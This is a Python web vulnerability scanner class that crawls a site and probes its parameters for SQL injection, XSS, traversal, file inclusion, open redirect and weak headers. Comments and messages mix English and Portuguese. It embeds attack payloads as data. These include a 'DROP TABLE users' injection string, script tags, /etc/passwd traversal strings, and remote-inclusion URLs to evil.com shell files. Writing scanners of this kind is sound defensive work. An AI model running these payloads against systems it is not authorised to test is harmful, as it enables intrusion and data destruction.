import requests
import re
import urllib.parse
import ssl
import socket
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import logging
import time
import random
from concurrent.futures import ThreadPoolExecutor

class Scanner:
    def __init__(self):
        self.target_url = ""
        self.base_url = ""
        self.domain = ""
        self.discovered_urls = set()
        self.visited_urls = set()
        self.vulnerabilities = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.timeout = 10
        self.max_threads = 5
        self.scanning = False
        self.scan_options = {}
        self.logger = self._setup_logger()
        
    def _setup_logger(self):
        logger = logging.getLogger('vulnerability_scanner')
        logger.setLevel(logging.INFO)
        return logger
        
    def set_target(self, url):
        self.target_url = url
        parsed_url = urlparse(url)
        self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        self.domain = parsed_url.netloc
        self.discovered_urls = set()
        self.visited_urls = set()
        self.vulnerabilities = []
        
    def set_headers(self, headers):
        self.headers.update(headers)
        
    def set_timeout(self, timeout):
        self.timeout = timeout
        self.logger.info(f"Timeout set to {timeout} seconds")
        
    def set_max_threads(self, max_threads):
        self.max_threads = max_threads
        
    def set_threads(self, threads):
        self.max_threads = threads
        
    def discover_urls(self, max_urls=100):
        """Discover URLs on the target website"""
        self.discovered_urls.add(self.target_url)
        urls_to_visit = [self.target_url]
        
        while urls_to_visit and len(self.discovered_urls) < max_urls:
            current_url = urls_to_visit.pop(0)
            if current_url in self.visited_urls:
                continue
                
            self.logger.info(f"Discovering links on: {current_url}")
            
            try:
                response = requests.get(current_url, headers=self.headers, timeout=self.timeout)
                self.visited_urls.add(current_url)
                
                if response.status_code == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        full_url = urljoin(current_url, href)
                        
                        # Only include URLs from the same domain
                        if self.domain in urlparse(full_url).netloc and full_url not in self.discovered_urls:
                            self.discovered_urls.add(full_url)
                            urls_to_visit.append(full_url)
            except Exception as e:
                self.logger.error(f"Error discovering URLs on {current_url}: {str(e)}")
                
        return self.discovered_urls
        
    def scan_all_vulnerabilities(self, urls=None):
        """Scan for all vulnerabilities on the discovered URLs"""
        if urls is None:
            urls = self.discovered_urls
            
        if not urls:
            urls = self.discover_urls()
            
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for url in urls:
                executor.submit(self._scan_url_for_vulnerabilities, url)
                
        return self.vulnerabilities
        
    def _scan_url_for_vulnerabilities(self, url):
        """Escanear uma única URL para todas as vulnerabilidades"""
        self.logger.info(f"Escaneando URL para vulnerabilidades: {url}")
        
        # Executar todas as verificações de vulnerabilidade
        self.check_sql_injection(url)
        self.check_xss(url)
        self.check_csrf(url)
        self.check_open_redirect(url)
        self.check_directory_traversal(url)
        self.check_file_inclusion(url)
        self.check_information_disclosure(url)
        self.check_insecure_headers(url)
        self.check_ssl_tls(url)
        self.check_brute_force(url)
        
    def add_vulnerability(self, url, vuln_type, risk_level, description, details=None):
        """Add a discovered vulnerability to the list"""
        vulnerability = {
            'url': url,
            'type': vuln_type,
            'risk_level': risk_level,
            'description': description,
            'details': details or {},
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.vulnerabilities.append(vulnerability)
        self.logger.warning(f"Vulnerabilidade encontrada: {vuln_type} em {url} - Risco: {risk_level}")
        return vulnerability
        
    def check_sql_injection(self, url):
        """Check for SQL Injection vulnerabilities"""
        payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --", "1' OR '1' = '1' --", "' UNION SELECT 1,2,3 --"]
        
        parsed_url = urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return
            
        for param_name, param_values in params.items():
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = url.split('?')[0] + '?' + query_string
                
                try:
                    response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                    
                    # Check for SQL error messages
                    error_patterns = [
                        "SQL syntax", "mysql_fetch_array", "ORA-", "PostgreSQL",
                        "SQLite3::", "Microsoft SQL Server", "ODBC Driver", "syntax error"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            self.add_vulnerability(
                                url,
                                "Injeção SQL",
                                "Crítica",
                                f"Possível vulnerabilidade de Injeção SQL no parâmetro '{param_name}'",
                                {
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': pattern
                                }
                            )
                            return
                except Exception as e:
                    self.logger.error(f"Error testing SQL injection on {url}: {str(e)}")
                    
    def check_xss(self, url):
        """Verificar vulnerabilidades de Script Entre Sites (XSS)"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        parsed_url = urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return
            
        for param_name, param_values in params.items():
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = url.split('?')[0] + '?' + query_string
                
                try:
                    response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                    
                    # Verificar se o payload está refletido na resposta
                    if payload in response.text:
                        self.add_vulnerability(
                            url,
                            "Script Entre Sites (XSS)",
                            "Alta",
                            f"Possível vulnerabilidade XSS no parâmetro '{param_name}'",
                            {
                                'parameter': param_name,
                                'payload': payload
                            }
                        )
                        return
                except Exception as e:
                    self.logger.error(f"Erro ao testar XSS em {url}: {str(e)}")
                    
    def check_csrf(self, url):
        """Verificar vulnerabilidades de Falsificação de Solicitação Entre Sites (CSRF)"""
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            
            if 'text/html' in response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    # Verificar se o formulário tem token CSRF
                    csrf_tokens = form.find_all(attrs={"name": re.compile(r"csrf|token|nonce", re.I)})
                    
                    if not csrf_tokens:
                        self.add_vulnerability(
                            url,
                            "Falsificação de Solicitação Entre Sites (CSRF)",
                            "Média",
                            "Formulário sem proteção CSRF detectado",
                            {
                                'form_action': form.get('action', ''),
                                'form_method': form.get('method', 'get')
                            }
                        )
        except Exception as e:
            self.logger.error(f"Erro ao testar CSRF em {url}: {str(e)}")
            
    def check_open_redirect(self, url):
        """Check for Open Redirect vulnerabilities"""
        redirect_params = ["redirect", "url", "next", "redir", "return", "returnto", "goto", "link"]
        
        parsed_url = urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return
            
        for param_name, param_values in params.items():
            if any(redirect_param in param_name.lower() for redirect_param in redirect_params):
                test_payloads = [
                    "https://evil.com",
                    "//evil.com",
                    "https:evil.com"
                ]
                
                for payload in test_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    query_string = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = url.split('?')[0] + '?' + query_string
                    
                    try:
                        response = requests.get(test_url, headers=self.headers, timeout=self.timeout, allow_redirects=False)
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if payload in location or "evil.com" in location:
                                self.add_vulnerability(
                                    url,
                                    "Open Redirect",
                                    "Medium",
                                    f"Open Redirect vulnerability in parameter '{param_name}'",
                                    {
                                        'parameter': param_name,
                                        'payload': payload,
                                        'redirect_url': location
                                    }
                                )
                                return
                    except Exception as e:
                        self.logger.error(f"Error testing Open Redirect on {url}: {str(e)}")
                        
    def check_directory_traversal(self, url):
        """Check for Directory Traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd"
        ]
        
        parsed_url = urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return
            
        for param_name, param_values in params.items():
            for payload in traversal_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = url.split('?')[0] + '?' + query_string
                
                try:
                    response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                    
                    # Check for common patterns in sensitive files
                    if "root:" in response.text or "win.ini" in response.text:
                        self.add_vulnerability(
                            url,
                            "Directory Traversal",
                            "High",
                            f"Directory Traversal vulnerability in parameter '{param_name}'",
                            {
                                'parameter': param_name,
                                'payload': payload
                            }
                        )
                        return
                except Exception as e:
                    self.logger.error(f"Error testing Directory Traversal on {url}: {str(e)}")
                    
    def check_file_inclusion(self, url):
        """Check for File Inclusion vulnerabilities"""
        lfi_payloads = [
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        rfi_payloads = [
            "http://evil.com/malicious.php",
            "https://evil.com/shell.php"
        ]
        
        parsed_url = urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            return
            
        for param_name, param_values in params.items():
            # Check for Local File Inclusion
            for payload in lfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = url.split('?')[0] + '?' + query_string
                
                try:
                    response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                    
                    # Check for common patterns in sensitive files
                    if "root:" in response.text or "win.ini" in response.text:
                        self.add_vulnerability(
                            url,
                            "Local File Inclusion",
                            "High",
                            f"Local File Inclusion vulnerability in parameter '{param_name}'",
                            {
                                'parameter': param_name,
                                'payload': payload
                            }
                        )
                        return
                except Exception as e:
                    self.logger.error(f"Error testing LFI on {url}: {str(e)}")
                    
            # Check for Remote File Inclusion
            for payload in rfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = url.split('?')[0] + '?' + query_string
                
                try:
                    response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                    
                    # This is a simplified check - in real scenarios, you'd need more sophisticated detection
                    if "evil.com" in response.text:
                        self.add_vulnerability(
                            url,
                            "Remote File Inclusion",
                            "Critical",
                            f"Remote File Inclusion vulnerability in parameter '{param_name}'",
                            {
                                'parameter': param_name,
                                'payload': payload
                            }
                        )
                        return
                except Exception as e:
                    self.logger.error(f"Error testing RFI on {url}: {str(e)}")
                    
    def check_information_disclosure(self, url):
        """Check for Information Disclosure vulnerabilities"""
        sensitive_patterns = [
            r"\b(?:password|passwd|pwd)\s*=\s*['\"]?[^'\"\s]+['\"]?",
            r"\b(?:username|user|uid)\s*=\s*['\"]?[^'\"\s]+['\"]?",
            r"\b(?:api[_-]?key|apikey|api[_-]?token)\s*=\s*['\"]?[^'\"\s]+['\"]?",
            r"\b(?:secret|private[_-]?key)\s*=\s*['\"]?[^'\"\s]+['\"]?",
            r"\b(?:database|db)[_-]?(?:username|user|password|passwd|host|name)\s*=\s*['\"]?[^'\"\s]+['\"]?",
            r"(?:<!--.*?-->)",  # HTML comments
            r"(?:/\*.*?\*/)",   # JavaScript/CSS comments
            r"(?:#.*?$)"        # Shell-style comments
        ]
        
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE | re.MULTILINE)
                
                if matches:
                    self.add_vulnerability(
                        url,
                        "Information Disclosure",
                        "Medium",
                        "Sensitive information disclosed in page source",
                        {
                            'evidence': matches[:3],  # Limit to first 3 matches
                            'pattern': pattern
                        }
                    )
                    return
        except Exception as e:
            self.logger.error(f"Error testing Information Disclosure on {url}: {str(e)}")
            
    def check_insecure_headers(self, url):
        """Check for Insecure Headers"""
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing CSP header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'X-XSS-Protection': 'Missing X-XSS-Protection header'
            }
            
            missing_headers = []
            
            for header, message in security_headers.items():
                if header not in headers:
                    missing_headers.append(message)
                    
            if missing_headers:
                self.add_vulnerability(
                    url,
                    "Insecure Headers",
                    "Low",
                    "Missing security headers detected",
                    {
                        'missing_headers': missing_headers
                    }
                )
                
            # Check for insecure cookie settings
            if 'Set-Cookie' in headers:
                cookies = headers.get('Set-Cookie')
                if 'HttpOnly' not in cookies:
                    self.add_vulnerability(
                        url,
                        "Insecure Cookies",
                        "Medium",
                        "Cookies missing HttpOnly flag",
                        {
                            'cookies': cookies
                        }
                    )
                    
                if 'Secure' not in cookies and url.startswith('https'):
                    self.add_vulnerability(
                        url,
                        "Insecure Cookies",
                        "Medium",
                        "Cookies missing Secure flag on HTTPS site",
                        {
                            'cookies': cookies
                        }
                    )
        except Exception as e:
            self.logger.error(f"Error testing Insecure Headers on {url}: {str(e)}")
            
    def check_ssl_tls(self, url):
        """Check for SSL/TLS vulnerabilities"""
        if not url.startswith('https'):
            return
            
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc
        port = 443
        
        try:
            # Check for SSL/TLS version
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    version = ssock.version()
                    
                    # Check for outdated SSL/TLS versions
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        self.add_vulnerability(
                            url,
                            "Outdated SSL/TLS",
                            "High",
                            f"Outdated SSL/TLS version detected: {version}",
                            {
                                'version': version
                            }
                        )
                        
                    # Get certificate information
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    import datetime
                    not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (not_after - datetime.datetime.now()).days
                    
                    if days_until_expiry < 30:
                        self.add_vulnerability(
                            url,
                            "SSL Certificate",
                            "Medium",
                            f"SSL Certificate expires soon: {days_until_expiry} days",
                            {
                                'expiry_date': cert['notAfter'],
                                'days_until_expiry': days_until_expiry
                            }
                        )
        except Exception as e:
            self.logger.error(f"Error testing SSL/TLS on {url}: {str(e)}")
            
    def check_brute_force(self, url):
        """Check for Brute Force vulnerabilities"""
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            
            if 'text/html' in response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Look for login forms
                login_forms = []
                
                for form in soup.find_all('form'):
                    password_field = form.find('input', {'type': 'password'})
                    if password_field:
                        login_forms.append(form)
                        
                if login_forms:
                    # Check if there's rate limiting or CAPTCHA
                    has_captcha = bool(soup.find(string=re.compile(r'captcha', re.I)) or 
                                      soup.find(attrs={'class': re.compile(r'captcha', re.I)}))
                    
                    if not has_captcha:
                        self.add_vulnerability(
                            url,
                            "Brute Force",
                            "Medium",
                            "Login form without CAPTCHA or rate limiting detected",
                            {
                                'form_count': len(login_forms)
                            }
                        )
        except Exception as e:
            self.logger.error(f"Error testing Brute Force on {url}: {str(e)}")
            
    def set_options(self, options):
        """Set scan options based on user selection"""
        self.scan_options = options
        self.logger.info(f"Scan options set: {options}")
        
    def set_user_agent(self, user_agent):
        """Set the User-Agent header"""
        self.headers['User-Agent'] = user_agent
        
    def stop(self):
        """Stop the scanning process"""
        self.scanning = False
        self.logger.info("Scanning process stopped by user")
        
    def get_results(self):
        """Return the list of vulnerabilities found during scanning"""
        return self.vulnerabilities
        
    def get_target(self):
        """Return the target URL being scanned"""
        return self.target_url
        
    def scan(self):
        """Main scanning method that orchestrates the entire scanning process"""
        self.scanning = True
        self.vulnerabilities = []
        
        try:
            # Discover URLs if we're scanning the entire site
            if self.scan_options.get('discover_urls', False):
                self.logger.info(f"Discovering URLs on {self.target_url}")
                discovered_urls = self.discover_urls()
                self.logger.info(f"Discovered {len(discovered_urls)} URLs")
            else:
                # Just scan the target URL
                discovered_urls = [self.target_url]
                
            # Scan each URL for selected vulnerability types
            for url in discovered_urls:
                if not self.scanning:
                    break
                    
                self.logger.info(f"Scanning URL: {url}")
                
                # Run selected vulnerability checks
                if self.scan_options.get('sql_injection', False):
                    self.check_sql_injection(url)
                    
                if self.scan_options.get('xss', False):
                    self.check_xss(url)
                    
                if self.scan_options.get('csrf', False):
                    self.check_csrf(url)
                    
                if self.scan_options.get('open_redirect', False):
                    self.check_open_redirect(url)
                    
                if self.scan_options.get('directory_traversal', False):
                    self.check_directory_traversal(url)
                    
                if self.scan_options.get('file_inclusion', False):
                    self.check_file_inclusion(url)
                    
                if self.scan_options.get('information_disclosure', False):
                    self.check_information_disclosure(url)
                    
                if self.scan_options.get('insecure_headers', False):
                    self.check_insecure_headers(url)
                    
                if self.scan_options.get('ssl_tls', False) and url.startswith('https'):
                    self.check_ssl_tls(url)
                    
                if self.scan_options.get('brute_force', False):
                    self.check_brute_force(url)
                    
            self.logger.info(f"Scan completed. Found {len(self.vulnerabilities)} vulnerabilities")
            return self.vulnerabilities
            
        except Exception as e:
            self.logger.error(f"Error during scan: {str(e)}")
            return self.vulnerabilities